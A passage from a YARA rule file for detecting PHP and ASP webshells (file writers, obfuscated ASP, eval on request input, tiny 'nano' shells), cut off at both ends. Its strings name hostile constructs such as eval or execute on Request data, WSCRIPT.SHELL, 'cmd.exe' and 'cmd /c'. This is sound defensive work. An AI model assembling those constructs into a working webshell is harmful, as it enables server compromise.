        $gfp11 = "(eval (getenv \"EPROLOG\")))"
        $gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"

    condition:
        filesize < 500KB and not (
            any of ( $gfp* )
        )
        and any of ( $sr* )
}

rule WEBSHELL_PHP_Writer
{
    meta:
        description = "PHP webshell which only writes an uploaded file to disk"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021/04/17"
        modified = "2023-07-05"
        score = 50
        hash = "ec83d69512aa0cc85584973f5f0850932fb1949fb5fb2b7e6e5bbfb121193637"
        hash = "407c15f94a33232c64ddf45f194917fabcd2e83cf93f38ee82f9720e2635fa64"
        hash = "988b125b6727b94ce9a27ea42edc0ce282c5dfeb"
        hash = "0ce760131787803bbef216d0ee9b5eb062633537"
        hash = "20281d16838f707c86b1ff1428a293ed6aec0e97"

        id = "05bb3e0c-69b2-5176-a3eb-e6ba2d72a205"
    strings:
        $sus3 = "'upload'" wide ascii
        $sus4 = "\"upload\"" wide ascii
        $sus5 = "\"Upload\"" wide ascii
        $sus6 = "gif89" wide ascii
        //$sus13= "<textarea " wide ascii
        $sus16= "Army" fullword wide ascii
        $sus17= "error_reporting( 0 )" wide ascii
        $sus18= "' . '" wide ascii

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

        //strings from private rule capa_php_input
        $inp1 = "php://input" wide ascii
        $inp2 = /_GET\s?\[/ wide ascii
        // for passing $_GET to a function
        $inp3 = /\(\s?\$_GET\s?\)/ wide ascii
        $inp4 = /_POST\s?\[/ wide ascii
        $inp5 = /\(\s?\$_POST\s?\)/ wide ascii
        $inp6 = /_REQUEST\s?\[/ wide ascii
        $inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
        // PHP automatically adds all the request headers into the $_SERVER global array, prefixing each header name by the "HTTP_" string, so e.g. @eval($_SERVER['HTTP_CMD']) will run any code in the HTTP header CMD
        $inp15 = "_SERVER['HTTP_" wide ascii
        $inp16 = "_SERVER[\"HTTP_" wide ascii
        $inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
        $inp18 = "array_values($_SERVER)" wide ascii
        $inp19 = /file_get_contents\("https?:\/\// wide ascii

        //strings from private rule capa_php_write_file
        $php_multi_write1 = "fopen(" wide ascii
        $php_multi_write2 = "fwrite(" wide ascii
        $php_write1 = "move_uploaded_file" fullword wide ascii
        $php_write2 = "copy" fullword wide ascii

    condition:
        //any of them or
        (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and (
            any of ( $inp* )
        )
        and (
        any of ( $php_write* ) or
        all of ( $php_multi_write* )
        )
        and
        (
            filesize < 400 or
            (
                filesize < 4000 and 1 of ( $sus* )
            )
        )
}

rule WEBSHELL_ASP_Writer
{
    meta:
        description = "ASP webshell which only writes an uploaded file to disk"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021/03/07"
        modified = "2023-07-05"
        score = 60
        hash = "df6eaba8d643c49c6f38016531c88332e80af33c"
        hash = "83642a926291a499916e8c915dacadd0d5a8b91f"
        hash = "5417fad68a6f7320d227f558bf64657fe3aa9153"
        hash = "97d9f6c411f54b56056a145654cd00abca2ff871"
        hash = "fc44fd7475ee6c0758ace2b17dd41ed7ea75cc73"

        id = "a1310e22-f485-5f06-8f1a-4cf9ae8413a1"
    strings:
        $sus1 = "password" fullword wide ascii
        $sus2 = "pwd" fullword wide ascii
        $sus3 = "<asp:TextBox" fullword nocase wide ascii
        $sus4 = "\"upload\"" wide ascii
        $sus5 = "\"Upload\"" wide ascii
        $sus6 = "gif89" wide ascii
        $sus7 = "\"&\"" wide ascii
        $sus8 = "authkey" fullword wide ascii
        $sus9 = "AUTHKEY" fullword wide ascii
        $sus10= "test.asp" fullword wide ascii
        $sus11= "cmd.asp" fullword wide ascii
        $sus12= ".Write(Request." wide ascii
        $sus13= "<textarea " wide ascii
        $sus14= "\"unsafe" fullword wide ascii
        $sus15= "'unsafe" fullword wide ascii
        $sus16= "Army" fullword wide ascii

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


        //strings from private rule capa_asp_input
        // Request.BinaryRead
        // Request.Form
        $asp_input1 = "request" fullword nocase wide ascii
        $asp_input2 = "Page_Load" fullword nocase wide ascii
        // base64 of Request.Form(
        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
        $asp_xml_method1 = "GET" fullword wide ascii
        $asp_xml_method2 = "POST" fullword wide ascii
        $asp_xml_method3 = "HEAD" fullword wide ascii
        // dynamic form
        $asp_form1 = "<form " wide ascii
        $asp_form2 = "<Form " wide ascii
        $asp_form3 = "<FORM " wide ascii
        $asp_asp   = "<asp:" wide ascii
        $asp_text1 = ".text" wide ascii
        $asp_text2 = ".Text" wide ascii

        //strings from private rule capa_asp_write_file
        // $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
        $asp_always_write1 = /\.write/ nocase wide ascii
        $asp_always_write2 = /\.swrite/ nocase wide ascii
        //$asp_write_way_one1 = /\.open\b/ nocase wide ascii
        $asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
        $asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
        $asp_cr_write1 = "CreateObject(" nocase wide ascii
        $asp_cr_write2 = "CreateObject (" nocase wide ascii
        $asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
        $asp_streamwriter2 = "filestream" fullword nocase wide ascii

    condition:
        (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and (
            any of ( $asp_input* ) or
        (
            $asp_xml_http and
            any of ( $asp_xml_method* )
        ) or
        (
            any of ( $asp_form* ) and
            any of ( $asp_text* ) and
            $asp_asp
        )
        )
        and (
        any of ( $asp_always_write* ) and
        (
            any of ( $asp_write_way_one* ) and
            any of ( $asp_cr_write* )
        ) or (
            any of ( $asp_streamwriter* )
        )
        )
        and
        ( filesize < 400 or
        ( filesize < 6000 and 1 of ( $sus* ) ) )
}

rule WEBSHELL_ASP_OBFUSC
{
    meta:
        description = "ASP webshell obfuscated"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/12"
        modified = "2023-07-05"
        hash = "ad597eee256de51ffb36518cd5f0f4aa0f254f27517d28fb7543ae313b15e112"
        hash = "e0d21fdc16e0010b88d0197ebf619faa4aeca65243f545c18e10859469c1805a"
        hash = "54a5620d4ea42e41beac08d8b1240b642dd6fd7c"
        hash = "fc44fd7475ee6c0758ace2b17dd41ed7ea75cc73"
        hash = "be2fedc38fc0c3d1f925310d5156ccf3d80f1432"
        hash = "3175ee00fc66921ebec2e7ece8aa3296d4275cb5"
        hash = "d6b96d844ac395358ee38d4524105d331af42ede"
        hash = "cafc4ede15270ab3f53f007c66e82627a39f4d0f"

        id = "3960b692-9f6f-52c5-b881-6f9e1b3ac555"
    strings:
        $asp_obf1 = "/*-/*-*/" wide ascii
        $asp_obf2 = "u\"+\"n\"+\"s" wide ascii
        $asp_obf3 = "\"e\"+\"v" wide ascii
        $asp_obf4 = "a\"+\"l\"" wide ascii
        $asp_obf5 = "\"+\"(\"+\"" wide ascii
        $asp_obf6 = "q\"+\"u\"" wide ascii
        $asp_obf7 = "\"u\"+\"e" wide ascii
        $asp_obf8 = "/*//*/" wide ascii

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


        //strings from private rule capa_asp_payload
        $asp_payload0  = "eval_r" fullword nocase wide ascii
        $asp_payload1  = /\beval\s/ nocase wide ascii
        $asp_payload2  = /\beval\(/ nocase wide ascii
        $asp_payload3  = /\beval\"\"/ nocase wide ascii
        // var Fla = {'E':eval};  Fla.E(code)
        $asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
        $asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
        $asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
        $asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
        $asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
        $asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
        $asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
        $asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
        $asp_multi_payload_one2 = "addcode" fullword wide ascii
        $asp_multi_payload_one3 = /\.run\b/ wide ascii
        $asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
        $asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
        $asp_multi_payload_two3 = "BuildManager" fullword wide ascii
        $asp_multi_payload_three1 = "System.Diagnostics" wide ascii
        $asp_multi_payload_three2 = "Process" fullword wide ascii
        $asp_multi_payload_three3 = ".Start" wide ascii
        // this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
        $asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
        $asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
        $asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii

        // execute cmd.exe /c with arguments using ProcessStartInfo
        $asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
        $asp_multi_payload_five2 = ".Start" nocase wide ascii
        $asp_multi_payload_five3 = ".Filename" nocase wide ascii
        $asp_multi_payload_five4 = ".Arguments" nocase wide ascii


        //strings from private rule capa_asp_write_file
        // $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
        $asp_always_write1 = /\.write/ nocase wide ascii
        $asp_always_write2 = /\.swrite/ nocase wide ascii
        //$asp_write_way_one1 = /\.open\b/ nocase wide ascii
        $asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
        $asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
        $asp_cr_write1 = "CreateObject(" nocase wide ascii
        $asp_cr_write2 = "CreateObject (" nocase wide ascii
        $asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
        $asp_streamwriter2 = "filestream" fullword nocase wide ascii

        //strings from private rule capa_asp_obfuscation_multi
        // many Chr or few and a loop????
        //$loop1 = "For "
        //$o1 = "chr(" nocase wide ascii
        //$o2 = "chr (" nocase wide ascii
        // not excactly a string function but also often used in obfuscation
        $o4 = "\\x8" wide ascii
        $o5 = "\\x9" wide ascii
        // just picking some random numbers because they should appear often enough in a long obfuscated blob and it's faster than a regex
        $o6 = "\\61" wide ascii
        $o7 = "\\44" wide ascii
        $o8 = "\\112" wide ascii
        $o9 = "\\120" wide ascii
        //$o10 = " & \"" wide ascii
        //$o11 = " += \"" wide ascii
        // used for e.g. "scr"&"ipt"

        $m_multi_one1 = "Replace(" wide ascii
        $m_multi_one2 = "Len(" wide ascii
        $m_multi_one3 = "Mid(" wide ascii
        $m_multi_one4 = "mid(" wide ascii
        $m_multi_one5 = ".ToString(" wide ascii

        /*
        $m_multi_one5 = "InStr(" wide ascii
        $m_multi_one6 = "Function" wide ascii

        $m_multi_two1 = "for each" wide ascii
        $m_multi_two2 = "split(" wide ascii
        $m_multi_two3 = " & chr(" wide ascii
        $m_multi_two4 = " & Chr(" wide ascii
        $m_multi_two5 = " & Chr (" wide ascii

        $m_multi_three1 = "foreach" fullword wide ascii
        $m_multi_three2 = "(char" wide ascii

        $m_multi_four1 = "FromBase64String(" wide ascii
        $m_multi_four2 = ".Replace(" wide ascii
        $m_multi_five1 = "String.Join(\"\"," wide ascii
        $m_multi_five2 = ".Trim(" wide ascii
        $m_any1 = " & \"2" wide ascii
        $m_any2 = " += \"2" wide ascii
        */

        $m_fp1 = "Author: Andre Teixeira - andret@microsoft.com" /* FPs with 0227f4c366c07c45628b02bae6b4ad01 */
        $m_fp2 = "DataBinder.Eval(Container.DataItem" ascii wide


        //strings from private rule capa_asp_obfuscation_obviously
        $oo1 = /\w\"&\"\w/ wide ascii
        $oo2 = "*/\").Replace(\"/*" wide ascii

    condition:
        filesize < 100KB and (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and
        ( ( (
            any of ( $asp_payload* ) or
        all of ( $asp_multi_payload_one* ) or
        all of ( $asp_multi_payload_two* ) or
        all of ( $asp_multi_payload_three* ) or
        all of ( $asp_multi_payload_four* ) or
        all of ( $asp_multi_payload_five* )
        )
        or (
        any of ( $asp_always_write* ) and
        (
            any of ( $asp_write_way_one* ) and
            any of ( $asp_cr_write* )
        ) or (
            any of ( $asp_streamwriter* )
        )
        )
        ) and
        ( (
        (
            filesize < 100KB and
            (
                //( #o1+#o2 ) > 50 or
                ( #o4+#o5+#o6+#o7+#o8+#o9 ) > 20
            )
        ) or (
            filesize < 5KB and
            (
                //( #o1+#o2 ) > 10 or
                ( #o4+#o5+#o6+#o7+#o8+#o9 ) > 5 or
                (
                    //( #o1+#o2 ) > 1 and
                    ( #m_multi_one1 + #m_multi_one2 + #m_multi_one3 + #m_multi_one4 + #m_multi_one5 ) > 3
                )

            )
        ) or (
            filesize < 700 and
            (
                //( #o1+#o2 ) > 1 or
                ( #o4+#o5+#o6+#o7+#o8+#o9 ) > 3 or
                ( #m_multi_one1 + #m_multi_one2 + #m_multi_one3 + #m_multi_one4 + #m_multi_one5 ) > 2
            )
        )
        )
        or any of ( $asp_obf* ) ) or (
        (
            filesize < 100KB and
            (
                ( #oo1 ) > 2 or
                $oo2
            )
        ) or (
            filesize < 25KB and
            (
                ( #oo1 ) > 1
            )
        ) or (
            filesize < 1KB and
            (
                ( #oo1 ) > 0
            )
        )
        )
        )
        and not any of ( $m_fp* )
}

rule WEBSHELL_ASP_Generic_Eval_On_Input
{
    meta:
        description = "Generic ASP webshell which uses any eval/exec function directly on user input"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/07"
        modified = "2023-04-05"
        hash = "d6b96d844ac395358ee38d4524105d331af42ede"
        hash = "9be2088d5c3bfad9e8dfa2d7d7ba7834030c7407"
        hash = "a1df4cfb978567c4d1c353e988915c25c19a0e4a"
        hash = "069ea990d32fc980939fffdf1aed77384bf7806bc57c0a7faaff33bd1a3447f6"

        id = "0904cefb-6e0f-5e5f-9986-cf83d409ce46"
    strings:
        $payload_and_input0 = /\beval_r\s{0,20}\(Request\(/ nocase wide ascii
        $payload_and_input1 = /\beval[\s\(]{1,20}request[.\(\[]/ nocase wide ascii
        $payload_and_input2 = /\bexecute[\s\(]{1,20}request\(/ nocase wide ascii
        $payload_and_input4 = /\bExecuteGlobal\s{1,20}request\(/ nocase wide ascii

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


    condition:
        ( filesize < 1100KB and (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and any of ( $payload_and_input* ) ) or
        ( filesize < 100 and any of ( $payload_and_input* ) )
}

rule WEBSHELL_ASP_Nano
{
    meta:
        description = "Generic ASP webshell which uses any eval/exec function"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/13"
        modified = "2023-04-05"
        hash = "3b7910a499c603715b083ddb6f881c1a0a3a924d"
        hash = "990e3f129b8ba409a819705276f8fa845b95dad0"
        hash = "22345e956bce23304f5e8e356c423cee60b0912c"
        hash = "c84a6098fbd89bd085526b220d0a3f9ab505bcba"
        hash = "b977c0ad20dc738b5dacda51ec8da718301a75d7"
        hash = "c69df00b57fd127c7d4e0e2a40d2f6c3056e0af8bfb1925938060b7e0d8c630f"
        hash = "f3b39a5da1cdde9acde077208e8e5b27feb973514dab7f262c7c6b2f8f11eaa7"
        hash = "0e9d92807d990144c637d8b081a6a90a74f15c7337522874cf6317092ea2d7c1"
        hash = "ebbc485e778f8e559ef9c66f55bb01dc4f5dcce9c31ccdd150e2c702c4b5d9e1"
        hash = "44b4068bfbbb8961e16bae238ad23d181ac9c8e4fcb4b09a66bbcd934d2d39ee"
        hash = "c5a4e188780b5513f34824904d56bf6e364979af6782417ccc5e5a8a70b4a95a"
        hash = "41a3cc668517ec207c990078bccfc877e239b12a7ff2abe55ff68352f76e819c"
        hash = "2faad5944142395794e5e6b90a34a6204412161f45e130aeb9c00eff764f65fc"
        hash = "d0c5e641120b8ea70a363529843d9f393074c54af87913b3ab635189fb0c84cb"
        hash = "28cfcfe28419a399c606bf96505bc68d6fe05624dba18306993f9fe0d398fbe1"

        id = "5f2f24c2-159d-51e1-80d9-11eeb77e8760"
    strings:
        $susasp1  = "/*-/*-*/"
        $susasp2  = "(\"%1"
        $susasp3  = /[Cc]hr\([Ss]tr\(/
        $susasp4  = "cmd.exe"
        $susasp5  = "cmd /c"
        $susasp7  = "FromBase64String"
        // Request and request in b64:
        $susasp8  = "UmVxdWVzdC"
        $susasp9  = "cmVxdWVzdA"
        $susasp10 = "/*//*/"
        $susasp11 = "(\"/*/\""
        $susasp12 = "eval(eval("
        $fp1      = "eval a"
        $fp2      = "'Eval'"
        $fp3      = "Eval(\""

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


        //strings from private rule capa_asp_payload
        $asp_payload0  = "eval_r" fullword nocase wide ascii
        $asp_payload1  = /\beval\s/ nocase wide ascii
        $asp_payload2  = /\beval\(/ nocase wide ascii
        $asp_payload3  = /\beval\"\"/ nocase wide ascii
        // var Fla = {'E':eval};  Fla.E(code)
        $asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
        $asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
        $asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
        $asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
        $asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
        $asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
        $asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
        $asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
        $asp_multi_payload_one2 = "addcode" fullword wide ascii
        $asp_multi_payload_one3 = /\.run\b/ wide ascii
